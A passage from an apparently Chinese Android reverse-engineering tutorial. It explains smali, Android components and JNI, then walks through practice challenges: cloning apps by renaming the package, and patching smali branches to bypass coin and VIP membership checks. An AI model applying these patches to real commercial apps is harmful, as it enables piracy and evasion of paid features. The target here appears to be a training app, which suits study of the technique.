种模式共存的方式。</p><p>​具体的工作过程如下：首先，在应用安装时 dex 文件不会被预先编译成机器码。而是在 App 运行时，dex 文件先通过解释器直接执行，热点函数会被识别并被 JIT 编译后存储在 JIT code cache 中并生成 profile 文件记录热点函数信息。最后当手机进入 idle 状态或者充电状态，系统扫描 app 目录下的 profile 文件进行AOT 编译。在这种模式下，无论是首次安装还是 APP 启动都能够保证很好的效率。</p><h1 id="smail-语法"><a class="markdownIt-Anchor" href="#smail-语法"></a> smail 语法</h1><p>​smali是Dalvik的寄存器语言，smali代码是dex反编译而来的。在smali里的所有操作都必须经过寄存器来进行：</p><ul><li><strong>本地寄存器</strong>用v开头数字结尾的符号来表示，如v0、v1、v2。</li><li><strong>参数寄存器</strong>则使用p开头数字结尾的符号来表示，如p0、p1、p2。<ul><li>特别注意的是，p0不一定是函数中的第一个参数。</li><li>在非static函数中，p0代指&quot;this&quot;，p1表示函数的第一个参数，p2代表函数中的第二个参数。</li><li>而在static函数中 p0 才对应第一个参数(因为Java的static方法中没有this方法)。</li></ul></li><li>具体语法可以参考 -&gt; <a href="https://www.52pojie.cn/thread-1701353-1-1.html">《安卓逆向这档事》三、初识smali，vip终结者 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></li></ul><p>补充：</p><ul><li>区分 <code>invoke-static</code> 与 <code>invoke-virtual</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">invoke-static &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;<br></code></pre></td></tr></table></figure><ul><li>这里将弹窗文本、显示时间等信息传给p1，这里 <code>invoke-static</code> 调用静态方法，{}中的寄存器就是指令的参数，代表了后面方法描述符中的参数类型，makeText()中是参数，后面紧跟着返回值。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V<br># 举例<br>invoke-virtual &#123;parameter_list&#125;, class_name-&gt;method_name(parameter_types)return_type<br></code></pre></td></tr></table></figure><ul><li>Toast;-&gt;show是弹窗代码，这里<code>invoke-virtual</code>是在Smali语言中用于调用对象的虚拟方法的指令，与<code>invoke-static</code>不同，<code>invoke-virtual</code>是针对对象的，它需要一个对象实例来调用方法。</li></ul><h1 id="android-四大组件"><a class="markdownIt-Anchor" href="#android-四大组件"></a> Android 四大组件</h1><h2 id="简介-4"><a class="markdownIt-Anchor" href="#简介-4"></a> 简介</h2><p>​它们都需要在 AndroidManifest.xml 文件中进行注册才能生效。</p><table><thead><tr><th style="text-align:left">组件</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">Activity(活动)</td><td style="text-align:left">在应用中的一个Activity可以用来表示一个界面，意思可以理解为&quot;活动&quot;，即一个活动开始，代表 Activity 组件启动，活动结束，代表一个Activity的生命周期结束。一个Android应用必须通过Activity来运行和启动，Activity的生命周期交给系统统一管理。</td></tr><tr><td style="text-align:left">Service(服务)</td><td style="text-align:left">Service它可以在后台执行长时间运行操作而没有用户界面的应用组件，不依赖任何用户界面，例如后台播放音乐，后台下载文件等。</td></tr><tr><td style="text-align:left">Broadcast Receiver(广播接收器)</td><td style="text-align:left">一个用于接收广播信息，并做出对应处理的组件。比如我们常见的系统广播：通知时区改变、电量低、用户改变了语言选项等。</td></tr><tr><td style="text-align:left">Content Provider(内容提供者)</td><td style="text-align:left">作为应用程序之间唯一的共享数据的途径，Content Provider主要的功能就是存储并检索数据以及向其他应用程序提供访问数据的接口。Android内置的许多数据都是使用Content Provider形式，供开发者调用的(如视频，音频，图片，通讯录等)</td></tr></tbody></table><h2 id="activity生命周期"><a class="markdownIt-Anchor" href="#activity生命周期"></a> Activity生命周期</h2><p>​对于一个activity，入口类的表示是通过下面 <code>&lt;intent-filter&gt;</code> 的标识来确定的，下列中 <code>&lt;action&gt;</code> 与 <code>&lt;category&gt;</code> 中的属性信息确定入口类。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.shimeng.qq2693533893.MainActivity&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">函数名称</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">onCreate()</td><td style="text-align:left">一个Activity启动后第一个被调用的函数，常用来在此方法中进行Activity的一些初始化操作。例如创建View，绑定数据，注册监听，加载参数等。</td></tr><tr><td style="text-align:left">onStart()</td><td style="text-align:left">当Activity显示在屏幕上时，此方法被调用但此时还无法进行与用户的交互操作。</td></tr><tr><td style="text-align:left">onResume()</td><td style="text-align:left">这个方法在onStart()之后调用，也就是在Activity准备好与用户进行交互的时候调用，此时的Activity一定位于Activity栈顶，处于运行状态。</td></tr><tr><td style="text-align:left">onPause()</td><td style="text-align:left">这个方法是在系统准备去启动或者恢复另外一个Activity的时候调用，通常在这个方法中执行一些释放资源的方法，以及保存一些关键数据。</td></tr><tr><td style="text-align:left">onStop()</td><td style="text-align:left">这个方法是在Activity完全不可见的时候调用的。</td></tr><tr><td style="text-align:left">onDestroy()</td><td style="text-align:left">这个方法在Activity销毁之前调用，之后Activity的状态为销毁状态。</td></tr><tr><td style="text-align:left">onRestart()</td><td style="text-align:left">当Activity从停止stop状态恢进入start状态时调用状态。</td></tr></tbody></table><p>​借用流程图片</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402251135842.png" alt="" /></p><h1 id="ndk开发"><a class="markdownIt-Anchor" href="#ndk开发"></a> NDK开发</h1><p>​NDK(Native Development Kit)是一套用于开发Android应用程序的工具集，它允许在C/C++中编写性能关键的部分代码，并将这些代码与Java代码进行连接。</p><h2 id="cpp文件说明"><a class="markdownIt-Anchor" href="#cpp文件说明"></a> cpp文件说明</h2><p>​cpp目录下包含两个文件 CMakeLists.txt 和 natice-lib.cpp。</p><table><thead><tr><th style="text-align:left">文件名</th><th style="text-align:left">作用</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">CMakeLists.txt</td><td style="text-align:left">构建配置文件</td><td style="text-align:left">CMakeLists.txt是用于配置NDK项目的构建系统的文件。它指定了构建所需的源文件、依赖项、编译选项等。在构建过程中，CMake会根据该文件的指示生成对应的构建脚本，用于编译本地代码并生成本地库。</td></tr><tr><td style="text-align:left">native-lib.cpp</td><td style="text-align:left">本地代码实现文件</td><td style="text-align:left">native-lib.cpp是包含本地代码实现的文件。它定义了通过Java和本地代码之间进行通信的本地方法。该文件中的函数实现将被编译为本地库，供Java代码调用。</td></tr></tbody></table><h3 id="cmakeliststxt"><a class="markdownIt-Anchor" href="#cmakeliststxt"></a> CMakeLIsts.txt</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment"># For more information about using CMake with Android Studio, read the</span><br><span class="hljs-comment"># documentation: https://d.android.com/studio/projects/add-native-code.html</span><br><br><span class="hljs-comment"># 设置构建本地库所需的CMake的最小版本要求</span><br><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.22</span>.<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 声明和命名项目</span><br><span class="hljs-keyword">project</span>(<span class="hljs-string">&quot;ndkdemo&quot;</span>)<br><br><span class="hljs-comment"># 创建并命名一个库，设置其类型为STATIC或SHARED，并指定源代码的相对路径</span><br><span class="hljs-comment"># 可以定义多个库，CMake会为您构建它们</span><br><span class="hljs-comment"># Gradle会自动将共享库打包到APK中</span><br><span class="hljs-keyword">add_library</span>(<br>        <span class="hljs-comment"># 设置库的名称</span><br>        ndkdemo<br><br>        <span class="hljs-comment"># 设置库类型为共享库</span><br>        SHARED<br><br>        <span class="hljs-comment"># 提供源文件的相对路径</span><br>        native-lib.cpp)<br><br><span class="hljs-comment"># 搜索指定的预构建库并将路径存储为变量。</span><br><span class="hljs-comment"># 由于CMake默认在搜索路径中包含系统库，因此您只需指定要添加的公共NDK库的名称。</span><br><span class="hljs-comment"># CMake会在完成构建之前验证该库是否存在。</span><br><span class="hljs-keyword">find_library</span>(<br>        <span class="hljs-comment"># 设置路径变量的名称</span><br>        log-lib<br><br>        <span class="hljs-comment"># 指定要让CMake定位的NDK库的名称</span><br>        log)<br><br><span class="hljs-comment"># 指定CMake应链接到目标库的库。</span><br><span class="hljs-comment"># 您可以链接多个库，例如在此构建脚本中定义的库、预构建的第三方库或系统库。</span><br><span class="hljs-keyword">target_link_libraries</span>(<br>        <span class="hljs-comment"># 指定目标库</span><br>        ndkdemo<br><br>        <span class="hljs-comment"># 将目标库链接到NDK中包含的log库</span><br>        <span class="hljs-variable">$&#123;log-lib&#125;</span>)<br></code></pre></td></tr></table></figure><h3 id="native-libcpp"><a class="markdownIt-Anchor" href="#native-libcpp"></a> native-lib.cpp</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;jni.h&gt;</span> <span class="hljs-comment">// JNI头文件，提供了JNI函数和数据类型的定义</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span> <span class="hljs-comment">// C++标准库的string类</span></span><br><br><span class="hljs-comment">// 声明一个jni函数，该函数将会被Java代码调用</span><br><span class="hljs-comment">// JNIEXPORT表示这个函数是可导出的，并且可以被其他代码使用</span><br><span class="hljs-comment">// jstring表示这个函数返回的是一个Java字符串对象</span><br><span class="hljs-comment">// JNICALL是JNI函数的调用约定</span><br><span class="hljs-comment">// Java_com_example_ndkdemo_MainActivity_stringFromJNI是JNI函数的命名规则，与Java中对应的方法名对应</span><br><span class="hljs-comment">// Java打头，1包名,2类名,3方法名字;&quot;_&quot;号隔开</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">JNIEXPORT jstring JNICALL</span><br><span class="hljs-function"><span class="hljs-title">Java_com_example_ndkdemo_MainActivity_stringFromJNI</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        JNIEnv* env, <span class="hljs-comment">// JNIEnv是指向JNI环境的指针，可以用来访问JNI提供的功能</span></span></span><br><span class="hljs-params"><span class="hljs-function">        jobject <span class="hljs-comment">/* this */</span>)</span> </span>&#123; <span class="hljs-comment">// jobject是指向Java对象的指针，在本例中并没有使用</span><br><br>    std::string hello = <span class="hljs-string">&quot;Hello from C++&quot;</span>; <span class="hljs-comment">// 创建一个C++字符串对象</span><br>    <span class="hljs-keyword">return</span> env-&gt;<span class="hljs-built_in">NewStringUTF</span>(hello.<span class="hljs-built_in">c_str</span>()); <span class="hljs-comment">// 将C++字符串对象转换为Java字符串对象并返回</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="mainactivityjava"><a class="markdownIt-Anchor" href="#mainactivityjava"></a> MainActivity.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br><br>    <span class="hljs-comment">// Used to load the &#x27;ndkdemo&#x27; library on application startup.</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;ndkdemo&quot;</span>); <span class="hljs-comment">// 加载名为&quot;ndkdemo&quot;的库</span><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> ActivityMainBinding binding; <span class="hljs-comment">// 声明一个ActivityMainBinding变量</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br><br>        binding = ActivityMainBinding.inflate(getLayoutInflater()); <span class="hljs-comment">// 使用ViewBinding将布局文件解析为一个ActivityMainBinding对象</span><br>        setContentView(binding.getRoot()); <span class="hljs-comment">// 将Activity的布局设置为根布局</span><br><br>        <span class="hljs-comment">// Example of a call to a native method</span><br>        <span class="hljs-type">TextView</span> <span class="hljs-variable">tv</span> <span class="hljs-operator">=</span> binding.sampleText; <span class="hljs-comment">// 获取布局文件中的TextView控件</span><br>        tv.setText(stringFromJNI()); <span class="hljs-comment">// 调用本地方法stringFromJNI()并将其返回的字符串设置为TextView的文本内容</span><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * A native method that is implemented by the &#x27;ndkdemo&#x27; native library,</span><br><span class="hljs-comment">     * which is packaged with this application.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">stringFromJNI</span><span class="hljs-params">()</span>; <span class="hljs-comment">// 声明一个native方法stringFromJNI()</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="jni"><a class="markdownIt-Anchor" href="#jni"></a> JNI</h2><p>​NDK是开发套件，JNI才是调用的框架。所以与其说是NDK开发，不如说是JNI的开发。不过NDK是Android提供的开发套件。JNI可不是，JNI全称Java Native Interface，即Java本地接口，JNI是Java调用Native 语言的一种特性。通过JNI可以使得 Java与 C/C++ 机型交互。</p><p>​即可以在Java代码中调用 C/C++ 等语言的代码或者在 C/C++ 代码中调用 Java 代码。</p><h3 id="注册方式"><a class="markdownIt-Anchor" href="#注册方式"></a> 注册方式</h3><h4 id="静态注册"><a class="markdownIt-Anchor" href="#静态注册"></a> 静态注册</h4><p>​上述过程就是静态注册</p><ul><li>优点: 理解和使用方式简单, 属于傻瓜式操作, 使用相关工具按流程操作就行, 出错率低</li><li>缺点: 当需要更改类名,包名或者方法时, 需要按照之前方法重新生成头文件, 灵活性不高</li></ul><h4 id="动态注册"><a class="markdownIt-Anchor" href="#动态注册"></a> 动态注册</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;jni.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><br><span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_com_example_ndkdemo_MainActivity_nativeGetStringFromJNI</span><span class="hljs-params">(JNIEnv* env, jobject obj)</span> </span>&#123;<br>    std::string hello = <span class="hljs-string">&quot;Hello wuaipojie&quot;</span>;<br>    <span class="hljs-keyword">return</span> env-&gt;<span class="hljs-built_in">NewStringUTF</span>(hello.<span class="hljs-built_in">c_str</span>());<br>&#125;<br><br><span class="hljs-comment">// 定义本地方法注册函数</span><br><span class="hljs-function">JNIEXPORT jint JNICALL <span class="hljs-title">JNI_OnLoad</span><span class="hljs-params">(JavaVM* vm, <span class="hljs-type">void</span>* reserved)</span> </span>&#123;<br>    JNIEnv* env;<br>    <span class="hljs-keyword">if</span> (vm-&gt;<span class="hljs-built_in">GetEnv</span>(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span>**&gt;(&amp;env), JNI_VERSION_1_6) != JNI_OK) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 定义要注册的本地方法</span><br>    JNINativeMethod methods[] = &#123;<br>        &#123;<span class="hljs-string">&quot;nativeGetStringFromJNI&quot;</span>, <span class="hljs-string">&quot;()Ljava/lang/String;&quot;</span>, <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span>*&gt;(Java_com_example_ndkdemo_MainActivity_nativeGetStringFromJNI)&#125;<br>    &#125;;<br><br>    <span class="hljs-comment">// 获取类引用</span><br>    jclass clazz = env-&gt;<span class="hljs-built_in">FindClass</span>(<span class="hljs-string">&quot;com/example/ndkdemo/MainActivity&quot;</span>);<br>    <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 注册本地方法</span><br>    <span class="hljs-keyword">if</span> (env-&gt;<span class="hljs-built_in">RegisterNatives</span>(clazz, methods, <span class="hljs-built_in">sizeof</span>(methods) / <span class="hljs-built_in">sizeof</span>(methods[<span class="hljs-number">0</span>])) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> JNI_VERSION_1_6;<br>&#125;<br><br>&#125; <span class="hljs-comment">// extern &quot;C&quot;</span><br></code></pre></td></tr></table></figure><h3 id="数据类型比对"><a class="markdownIt-Anchor" href="#数据类型比对"></a> 数据类型比对</h3><p>​这里比对C++，java，JNI的数据类型，使用的时候需要正确转化</p><table><thead><tr><th style="text-align:left">C++ 数据类型</th><th style="text-align:left">Java 数据类型</th><th style="text-align:left">JNI 数据类型签名</th></tr></thead><tbody><tr><td style="text-align:left">jint</td><td style="text-align:left">int</td><td style="text-align:left">“I”</td></tr><tr><td style="text-align:left">jboolean</td><td style="text-align:left">boolean</td><td style="text-align:left">“Z”</td></tr><tr><td style="text-align:left">jbyte</td><td style="text-align:left">byte</td><td style="text-align:left">“B”</td></tr><tr><td style="text-align:left">jchar</td><td style="text-align:left">char</td><td style="text-align:left">“C”</td></tr><tr><td style="text-align:left">jshort</td><td style="text-align:left">short</td><td style="text-align:left">“S”</td></tr><tr><td style="text-align:left">jlong</td><td style="text-align:left">long</td><td style="text-align:left">“J”</td></tr><tr><td style="text-align:left">jfloat</td><td style="text-align:left">float</td><td style="text-align:left">“F”</td></tr><tr><td style="text-align:left">jdouble</td><td style="text-align:left">double</td><td style="text-align:left">“D”</td></tr><tr><td style="text-align:left">jobject</td><td style="text-align:left">Object</td><td style="text-align:left">“Ljava/lang/Object;”</td></tr><tr><td style="text-align:left">jstring</td><td style="text-align:left">String</td><td style="text-align:left">“Ljava/lang/String;”</td></tr><tr><td style="text-align:left">jarray</td><td style="text-align:left">Array</td><td style="text-align:left">“[elementType”</td></tr><tr><td style="text-align:left">jobjectArray</td><td style="text-align:left">Object[]</td><td style="text-align:left">“[Ljava/lang/Object;”</td></tr><tr><td style="text-align:left">jbooleanArray</td><td style="text-align:left">boolean[]</td><td style="text-align:left">“[Z”</td></tr><tr><td style="text-align:left">jbyteArray</td><td style="text-align:left">byte[]</td><td style="text-align:left">“[B”</td></tr><tr><td style="text-align:left">jcharArray</td><td style="text-align:left">char[]</td><td style="text-align:left">“[C”</td></tr><tr><td style="text-align:left">jshortArray</td><td style="text-align:left">short[]</td><td style="text-align:left">“[S”</td></tr><tr><td style="text-align:left">jintArray</td><td style="text-align:left">int[]</td><td style="text-align:left">“[I”</td></tr><tr><td style="text-align:left">jlongArray</td><td style="text-align:left">long[]</td><td style="text-align:left">“[J”</td></tr><tr><td style="text-align:left">jfloatArray</td><td style="text-align:left">float[]</td><td style="text-align:left">“[F”</td></tr><tr><td style="text-align:left">jdoubleArray</td><td style="text-align:left">double[]</td><td style="text-align:left">“[D”</td></tr></tbody></table><h1 id="challenge"><a class="markdownIt-Anchor" href="#challenge"></a> Challenge</h1><h2 id="第一关"><a class="markdownIt-Anchor" href="#第一关"></a> 第一关</h2><blockquote><p>APK结构 &amp; 双开 &amp; 汉化 &amp; APK基础修改</p></blockquote><h3 id="双开"><a class="markdownIt-Anchor" href="#双开"></a> 双开</h3><h4 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h4><p>​双开：简单来说，就是手机同时运行两个或多个相同的应用，例如同时运行两个微信</p><table><thead><tr><th style="text-align:left">原理</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">修改包名</td><td style="text-align:left">让手机系统认为这是2个APP，这样的话就能生成2个数据存储路径，此时的多开就等于你打开了两个互不干扰的APP</td></tr><tr><td style="text-align:left">修改Framework</td><td style="text-align:left">对于有系统修改权限的厂商，可以修改Framework来实现双开的目的，例如：小米自带多开</td></tr><tr><td style="text-align:left">通过虚拟化技术实现</td><td style="text-align:left">虚拟Framework层、虚拟文件系统、模拟Android对组件的管理、虚拟应用进程管理 等一整套虚拟技术，将APK复制一份到虚拟空间中运行，例如：平行空间</td></tr><tr><td style="text-align:left">以插件机制运行</td><td style="text-align:left">利用反射替换，动态代{过}{滤}理，hook了系统的大部分与system—server进程通讯的函数，以此作为&quot;欺上瞒下&quot;的目的，欺骗系统&quot;以为&quot;只有一个apk在运行，瞒过插件让其&quot;认为&quot;自己已经安装。例如：VirtualApp</td></tr></tbody></table><h4 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution</h4><p>​首先在 <strong>MT管理器</strong> 或者 <strong>NP管理器</strong> 提取安装包，然后使用 <code>APK共存功能</code>，修改包名，然后这两个管理器可以自动签名，之后就可以安装共存了。同时安装可能出现签名不对的情况，这个是因为两次签名的文件不同，直接把原先的软件卸载即可。但是若是开发者使用了签名校验，那么这个就过不去，会导致闪退崩溃等情况。</p><h3 id="基础修改"><a class="markdownIt-Anchor" href="#基础修改"></a> 基础修改</h3><p>​对于文本，这里就是使用 <code>开发者助手</code> -&gt; <code>界面资源分析</code> -&gt; 复制文本(Я не могу поверить, что это работает, почему?)。之后在 MT管理器 中搜索字符串，找到在 <code>resources.arsc</code> 文件中，然后使用 <strong>arsc编辑器</strong> 打开，利用搜索资源值找到位置进行修改，或者对.arsc文件利用 <strong>翻译模式</strong>，在 [DEFAULT] 中修改字符串。</p><p>​对于图片，使用 <code>开发助手</code> -&gt; <code>布局查看</code>，找到图片的 <code>View Id(Hex)</code> 为 0x7f0800dd，之后在MT管理器中使用XML搜索，以十六进制搜索资源ID，然后得到文件，获得ID值，这里src就是指代 resource.arsc 文件，之后点击文件编辑，以 ID定位资源 可以找到具体的图片路径，然后进行修改。</p><table style="border:none;text-align:center;width:auto;margin: 0 auto;"><tbody><tr><td style="padding: 6px"><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402242311805.png" ></td>      <td><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402242312067.png" ></td></tr>        <tr>        <td><strong> 搜索资源ID </strong></td>        <td><strong> 找到配套资源 </td>        </tr></tbody></table><h2 id="第二关"><a class="markdownIt-Anchor" href="#第二关"></a> 第二关</h2><p>修改方法：修改判断、强制跳转、修改寄存器的值。</p><p>tips：在 jadx 中分析 java代码时，这里java代码中每个方法上面的注释对应着smail中方法的名称，可以根据这个来快速查找相应代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* renamed from: onCreate$lambda-2 */</span> <span class="hljs-comment">//这里就是对应smail代码的方法名</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> m38onCreate$lambda2(Ref.IntRef intRef, ChallengeSecond challengeSecond, ImageView imageView, ImageView imageView2, ImageView imageView3, View view) &#123;<br>    <span class="hljs-keyword">if</span> (intRef.element &lt; <span class="hljs-number">10</span>) &#123;<br>        Toast.makeText(challengeSecond, <span class="hljs-string">&quot;请先获取10个硬币哦&quot;</span>, <span class="hljs-number">1</span>).show();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (challengeSecond.isvip()) &#123;<br>        <span class="hljs-type">ChallengeSecond</span> <span class="hljs-variable">challengeSecond2</span> <span class="hljs-operator">=</span> challengeSecond;<br>        Toast.makeText(challengeSecond2, <span class="hljs-string">&quot;当前已经是大会员了哦！&quot;</span>, <span class="hljs-number">1</span>).show();<br>        imageView.setImageResource(R.mipmap.zan_active);<br>        imageView2.setImageResource(R.mipmap.coin_active);<br>        imageView3.setImageResource(R.mipmap.collect_active);<br>        SPUtils.INSTANCE.saveInt(challengeSecond2, <span class="hljs-string">&quot;level&quot;</span>, <span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Toast.makeText(challengeSecond, <span class="hljs-string">&quot;请先充值大会员哦！&quot;</span>, <span class="hljs-number">1</span>).show();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="修改判断"><a class="markdownIt-Anchor" href="#修改判断"></a> 修改判断</h3><p>​首先在dex文件中搜索关键字定位smail代码，然后修改获取硬币处和判断大会员处的判断即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">124: if-ge p0, v0, :cond_15  -&gt; if-le p0, v0, :cond_15# 修改硬币数量判断<br>147: if-eqz p0, :cond_43 -&gt; if-nez p0, :cond_43# 修改大会员判断<br></code></pre></td></tr></table></figure><h3 id="强制跳转"><a class="markdownIt-Anchor" href="#强制跳转"></a> 强制跳转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">147: if-eqz p0, :cond_43 -&gt; #if-eqz p0, :cond_43# 直接注释判断，直接运行之后程序<br></code></pre></td></tr></table></figure><h3 id="修改寄存器"><a class="markdownIt-Anchor" href="#修改寄存器"></a> 